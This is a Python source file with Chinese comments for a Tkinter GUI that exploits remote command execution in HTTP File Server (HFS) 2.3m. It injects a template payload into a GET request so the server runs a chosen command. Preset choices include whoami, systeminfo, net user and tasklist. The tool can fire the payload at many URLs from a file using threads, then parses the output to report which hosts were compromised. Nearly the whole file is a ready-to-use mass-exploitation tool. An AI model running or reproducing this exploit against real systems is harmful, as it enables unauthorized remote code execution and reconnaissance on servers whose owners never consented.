import http.client
from urllib.parse import urlparse, quote
import time
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import scrolledtext, filedialog, ttk  # 导入ttk模块


def is_exploit_successful(html_content):
    # 寻找RESULT:和====之间的内容
    start_index = html_content.find('RESULT:') + len('RESULT:')
    end_index = html_content.find('====\n', start_index)

    result_content = html_content[start_index:end_index].strip()  # 去除两端空白字符

    # 判断是否成功
    if result_content:
        return True, result_content
    else:
        return False, None


def fetch_response(url, request_path, headers):
    parsed_url = urlparse(url)
    target_host = parsed_url.hostname
    target_port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)

    for attempt in range(3):  # 重试三次
        try:
            if parsed_url.scheme == 'https':
                conn = http.client.HTTPSConnection(target_host, target_port)
            else:
                conn = http.client.HTTPConnection(target_host, target_port)

            conn.request('GET', request_path, headers=headers)
            response = conn.getresponse()
            return response

        except (http.client.HTTPException, ConnectionError) as e:
            print(f"URL '{url}' 连接失败，正在重试... 错误: {e}")
            time.sleep(2)  # 等待 2 秒后重试

    raise http.client.HTTPException(f"URL '{url}' 发生 HTTPException 错误: 连接失败")


def process_url(url, command, output_file=None):
    try:
        # 如果用户没有输入协议，自动添加http://前缀
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        parsed_url = urlparse(url)

        if parsed_url.scheme not in ['http', 'https']:
            print(f"警告: URL '{url}' 使用了无效的协议，仅支持 HTTP 和 HTTPS。")
            return

        target_host = parsed_url.hostname
        target_port = parsed_url.port if parsed_url.port else (80 if parsed_url.scheme == 'http' else 443)

        # 使用用户指定的命令生成请求路径，双右花括号表示一个右花括号
        request_path = f'/?n=%0A&cmd={command}&search=%25xxx%25url%25:%password%}}{{.exec|{{.?cmd.}}|timeout=15|out=abc.}}{{.?n.}}{{.?n.}}RESULT:{{.?n.}}{{.^abc.}}===={{.?n.}}'

        # 请求头
        headers = {
            'Host': f'{target_host}:{target_port}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # 获取响应
        response = fetch_response(url, request_path, headers)

        # 读取并打印响应内容
        if response.getheader('Content-Encoding') == 'gzip':
            import gzip
            from io import BytesIO
            compressed_data = response.read()
            buf = BytesIO(compressed_data)
            f = gzip.GzipFile(fileobj=buf)
            html_content = f.read().decode('utf-8', errors='ignore')  # 解压缩并解码，忽略错误
        else:
            html_content = response.read().decode('utf-8', errors='ignore')  # 假设响应是 UTF-8 编码的，忽略错误

        # 检查漏洞利用是否成功，并输出结果
        success, result = is_exploit_successful(html_content)
        if success:
            return f"URL '{url}' 漏洞利用成功！结果内容:\n{result}\n"
        else:
            return f"URL '{url}' 漏洞利用失败。"

    except (http.client.HTTPException, ConnectionError) as e:
        return f"URL '{url}' 连接失败: {e}"

    except Exception as ex:
        return f"URL '{url}' 发生错误: {ex}"


class VisualizationWindow:
    def __init__(self, root):
        self.root = root
        self.root.title("hfs 2.3m 利用工具")  # 修改窗口标题

        # 设置字体为微软雅黑
        default_font = ("微软雅黑", 10)

        # 创建输入框和标签
        tk.Label(root, text="目标 URL:", font=default_font).grid(row=0, column=0, sticky="w", padx=10, pady=5)
        self.url_entry = tk.Entry(root, width=50, font=default_font)
        self.url_entry.grid(row=0, column=1, padx=10, pady=5)

        # 创建命令下拉菜单
        tk.Label(root, text="命令:", font=default_font).grid(row=1, column=0, sticky="w", padx=10, pady=5)
        self.cmd_combo = ttk.Combobox(root, width=47, font=default_font)
        self.cmd_combo['values'] = ('whoami', 'systeminfo', 'ipconfig', 'net user', 'tasklist /svc')
        self.cmd_combo.current(0)  # 默认选择第一个命令
        self.cmd_combo.grid(row=1, column=1, padx=10, pady=5)

        tk.Label(root, text="输出文件:", font=default_font).grid(row=2, column=0, sticky="w", padx=10, pady=5)
        self.output_entry = tk.Entry(root, width=50, font=default_font)
        self.output_entry.grid(row=2, column=1, padx=10, pady=5)
        tk.Button(root, text="浏览", command=self.browse_output_file, font=default_font).grid(row=2, column=2, padx=5, pady=5)

        tk.Label(root, text="URL 文件:", font=default_font).grid(row=3, column=0, sticky="w", padx=10, pady=5)
        self.url_file_entry = tk.Entry(root, width=50, font=default_font)
        self.url_file_entry.grid(row=3, column=1, padx=10, pady=5)
        tk.Button(root, text="浏览", command=self.browse_url_file, font=default_font).grid(row=3, column=2, padx=5, pady=5)

        # 创建文本区域显示结果
        tk.Label(root, text="结果:", font=default_font).grid(row=4, column=0, sticky="w", padx=10, pady=5)
        self.result_text = scrolledtext.ScrolledText(root, width=80, height=20, font=default_font)
        self.result_text.grid(row=5, column=0, columnspan=3, padx=10, pady=5)

        # 创建“开始”按钮
        tk.Button(root, text="开始", command=self.start_processing, font=default_font).grid(row=0, column=2, padx=5, pady=5)

        # 创建“清除”按钮，并放置在第二个“浏览”按钮下面
        tk.Button(root, text="清除历史记录", command=self.clear_records, font=default_font).grid(row=4, column=1, padx=5, pady=5)

    def browse_output_file(self):
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.output_entry.delete(0, tk.END)
            self.output_entry.insert(0, filename)

    def browse_url_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.url_file_entry.delete(0, tk.END)
            self.url_file_entry.insert(0, filename)

    def start_processing(self):
        url = self.url_entry.get()
        cmd = self.cmd_combo.get()  # 从下拉菜单获取命令
        output_file = self.output_entry.get()
        url_file = self.url_file_entry.get()

        urls = []
        if url:
            urls.append(url)
        elif url_file:
            try:
                with open(url_file, 'r') as f:
                    urls = [line.strip() for line in f.readlines() if line.strip()]
            except Exception as e:
                self.result_text.insert(tk.END, f"读取 URL 文件失败: {e}\n")
                return

        if not urls:
            self.result_text.insert(tk.END, "错误: 请提供至少一个目标 URL。\n")
            return

        # 清空输出文件（如果存在）
        if output_file:
            try:
                open(output_file, 'w').close()
            except Exception as e:
                self.result_text.insert(tk.END, f"清空输出文件失败: {e}\n")

        # 使用多线程加速处理
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url in urls:
                futures.append(executor.submit(process_url, url, quote(cmd), output_file))

            for future in futures:
                try:
                    result = future.result()
                    self.result_text.insert(tk.END, result + "\n")
                except Exception as e:
                    self.result_text.insert(tk.END, f"处理 URL 时发生错误: {e}\n")

    def clear_records(self):
        # 清除结果文本区域的内容
        self.result_text.delete(1.0, tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = VisualizationWindow(root)
    root.mainloop()